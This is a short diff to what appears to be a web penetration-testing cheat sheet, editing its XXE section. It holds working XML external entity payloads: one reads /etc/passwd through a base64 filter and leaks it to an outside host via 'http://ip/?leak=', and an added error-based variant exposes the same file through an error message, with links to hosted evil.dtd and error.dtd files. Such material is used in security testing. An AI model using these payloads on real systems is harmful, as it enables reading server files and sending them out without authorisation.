@@ -683,11 +683,22 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 
 -> Part 2
   
-codes/xxe_oob/evil.dtd
+codes/xxe/evil.dtd
+  
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.dtd
   
 \<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
   
 \<!ENTITY % param1 "\<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">
+  
+## XXE OOB to retrieve data via error messages
+  
+\<!ENTITY % file SYSTEM "file:///etc/passwd">
+\<!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
+
+codes/xxe/error.dtd
+
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/error.dtd
   
 ## XSLT Server Side Injection
   
